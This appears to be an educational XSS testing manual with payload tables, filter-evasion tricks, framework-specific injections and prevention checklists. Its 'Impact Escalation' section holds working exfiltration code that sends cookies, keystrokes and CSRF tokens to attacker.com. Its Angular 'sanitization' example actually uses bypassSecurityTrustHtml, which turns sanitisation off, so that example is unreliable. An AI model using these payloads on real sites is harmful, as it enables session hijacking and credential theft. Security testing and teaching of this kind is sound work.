Advanced XSS Testing Manual

# Advanced XSS Testing Manual

## Comprehensive Guide to DOM-Based, Reflected, and Stored XSS

## 1\. DOM-Based XSS Deep Dive

### 1.1 Methodology

1.  **Source Identification**
    *   `document.location` (URL fragments)
    *   `window.name`
    *   `document.referrer`
    *   `postMessage` events
    *   Web Storage (localStorage/sessionStorage)
2.  **Sink Analysis**
    
    | Sink Type | Dangerous Methods | Example Payload |
    | --- | --- | --- |
    | HTML Injection | `innerHTML, outerHTML, document.write()` | `<img src=x onerror=alert(1)>` |
    | JS Execution | `eval(), setTimeout(), Function()` | `';alert(1);//` |
    | jQuery | `$(), html(), append()` | `<img src=x onerror=alert(1)>` |
    

### 1.2 Advanced Testing Techniques

#### HTML Sink Testing

1\. Inject: window.name = "xss\_test\_"+Math.random().toString(36).substr(2,8);
2. Open Chrome DevTools → Elements tab
3. Search DOM (Ctrl+F) for your test string
4. Analyze context:
   - Inside attributes? Try: " autofocus onfocus=alert(1) x="
   - Inside HTML? Try: <svg onload=alert(1)>
   - Inside script? Try: '-alert(1)-'

#### JavaScript Sink Testing

1\. Search all JS files (Ctrl+Shift+F) for:
   - location.hash
   - document.cookie
   - window.name
2. Set breakpoints in suspicious sinks
3. Trace variable flow through execution
4. Test progressive payloads:
   - Basic: alert(1)
   - Context-aware: '-alert(1)-'
   - Filter evasion: alert\`1\`

### 1.3 Framework-Specific Vulnerabilities

#### AngularJS XSS

<div ng-app>
  {{constructor.constructor('alert(1)')()}}
</div>

#### jQuery XSS

// Classic hashchange exploit
<iframe src="https://vulnerable.com#" onload="this.src+='<img src=x onerror=alert(1)>'">

### 1.4 Exploiting DOM XSS with Different Sources and Sinks

In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. Different sources and sinks have varying properties that affect exploitability:

#### Common Sink Patterns

| Sink | Exploitability | Example Payload | Lab Reference |
| --- | --- | --- | --- |
| `document.write()` | High - accepts script tags | `document.write('<script>alert(document.domain)</script>')` | DOM XSS using location.search (Solved) |
| `innerHTML` | Medium - requires alternative vectors | `element.innerHTML='<img src=1 onerror=alert(1)>'` | DOM XSS in innerHTML sink (Solved) |
| `location.hash` | Context-dependent | `#<img src=x onerror=alert(1)>` | jQuery hashchange (Solved) |

#### Framework-Specific Sinks

##### jQuery Vulnerabilities

// Attribute manipulation
"$('#backLink').attr("href", location.search);"
// Exploit: "?returnUrl=javascript:alert(document.domain)"

// Selector injection
"$(window).on('hashchange', function() {"
"    $(location.hash).scrollIntoView();"
"});"
// Exploit via iframe:
"<iframe src="https://vulnerable.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">"

##### AngularJS Vulnerabilities

<div ng-app>
  {{constructor.constructor('alert(1)')()}}
</div>
// Lab: DOM XSS in AngularJS expression (Not solved)

#### Hybrid DOM XSS Patterns

| Type | Description | Example | Lab Status |
| --- | --- | --- | --- |
| Reflected DOM | Server echoes input into JS context | `eval('var data = "'+userInput+'"')` | Reflected DOM XSS (Not solved) |
| Stored DOM | Server stores then serves malicious payload | `element.innerHTML = storedData` | Stored DOM XSS (Not solved) |

#### Complete Sink Reference

##### Native JavaScript Sinks

*   `document.write()`
*   `document.writeln()`
*   `element.innerHTML`
*   `element.outerHTML`
*   `element.insertAdjacentHTML`
*   `element.onevent`

##### jQuery Sinks

*   `add()`
*   `html()`
*   `append()`
*   `prepend()`
*   `jQuery.parseHTML()`
*   `$() (selector)`

#### Prevention Checklist

*   Avoid dynamic HTML writing with untrusted data
*   Use `textContent` instead of `innerHTML`
*   Implement Content Security Policy (CSP)
*   Sanitize inputs in framework contexts (AngularJS, React, etc.)
*   Regularly audit third-party libraries

## 2\. Reflected XSS Mastery

### 2.1 Context-Specific Payloads

| Context | Payload | Bypass Technique |
| --- | --- | --- |
| HTML Text | `<script>alert(1)</script>` | Case variation: <ScRiPt> |
| HTML Attribute | `" onmouseover=alert(1) x="` | New events: onpointerenter |
| JavaScript String | `'-alert(1)-'` | Template literals: \`${alert(1)}\` |
| URL Context | `javascript:alert(1)` | Data URI: data:text/html,<script>alert(1)</script> |

### 2.2 Advanced Filter Evasion

// Chrome XSS Auditor Bypass
<script>
location.href = 'javascript:alert%281%29';
</script>

// UTF-7 Bypass (IE)
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

// JavaScript Obfuscation
eval('al'+'ert(1)');
window\['al'+'ert'\](1);

## 3\. Stored XSS Professional

### 3.1 Entry Point Discovery

*   **User Content**: Comments, profiles, uploads
*   **Metadata**: Filenames, EXIF data
*   **API Responses**: JSON/XML responses
*   **Admin Features**: Logs, moderation queues

### 3.2 Advanced Persistence Techniques

// SVG XSS
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

// PDF Embedded JS
/Names <</JavaScript <</Names \[(alert(1))\]>>>>

// HTML5 Storage
<script>
localStorage.setItem('xss', '<img src=x onerror=alert(1)>');
location.reload();
</script>

### 3.3 Impact Escalation

// Session Hijacking
document.location='https://attacker.com/?cookie='+document.cookie;

// Keylogger
document.onkeypress = function(e) {
    new Image().src='https://attacker.com/?k='+e.key;
};

// CSRF Token Theft
fetch('/account')
    .then(r => r.text())
    .then(t => {
        let token = t.match(/csrfToken = '(.\*?)'/)\[1\];
        new Image().src='https://attacker.com/?token='+token;
    });

## 4\. XSS Prevention Checklist

### 4.1 Defense Mechanisms

| Technique | Implementation | Effectiveness |
| --- | --- | --- |
| Content Security Policy | `Content-Security-Policy: default-src 'self'` | High (when properly configured) |
| Input Validation | Whitelist allowed characters | Medium (context-dependent) |
| Output Encoding | HTML Entity Encoding: &lt;script&gt; | High (when context-aware) |
| Secure Cookies | `Set-Cookie: HttpOnly; Secure` | Mitigates impact |

### 4.2 Framework Protections

// React (JSX auto-escapes)
<div>{userInput}</div>

// Angular (sanitization)
import { DomSanitizer } from '@angular/platform-browser';
this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);

// Vue (v-html directive)
<div v-html="sanitizedContent"></div>

## 5\. Professional Testing Tools

### 5.1 Automated Scanning

*   **Burp Suite**: DOM Invader extension
*   **ZAP**: Active scanner with XSS rules
*   **XSStrike**: Advanced detection engine

### 5.2 Manual Testing Utilities

// XSS Polyglot
javascript:/\*--></title></style></textarea></script><xmp><svg/onload='+/"/+/onmouseover=1/+/\[\*/\[\]/+alert(1)//'>

// Cheatsheets
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

**Legal Note:** Always obtain proper authorization before testing. This guide is for educational purposes only.

Last updated: 2023-11-15 | Based on OWASP Top 10 2021


## Which Sinks Can Lead to DOM-XSS Vulnerabilities?

The following are some of the main sinks that can lead to **DOM-based XSS** vulnerabilities:

- `document.write()`
- `document.writeln()`
- `document.domain`
- `element.innerHTML`
- `element.outerHTML`
- `element.insertAdjacentHTML`
- `element.onevent` *(e.g., `onclick`, `onerror`, etc.)*

### jQuery Sinks That Can Lead to DOM-XSS:

The following jQuery functions are also **sinks** that can introduce DOM-XSS vulnerabilities:

- `add()`
- `after()`
- `append()`
- `animate()`
- `insertAfter()`
- `insertBefore()`
- `before()`
- `html()`
- `prepend()`
- `replaceAll()`
- `replaceWith()`
- `wrap()`
- `wrapInner()`
- `wrapAll()`
- `has()`
- `constructor()`
- `init()`
- `index()`
- `jQuery.parseHTML()`
- `$.parseHTML()`
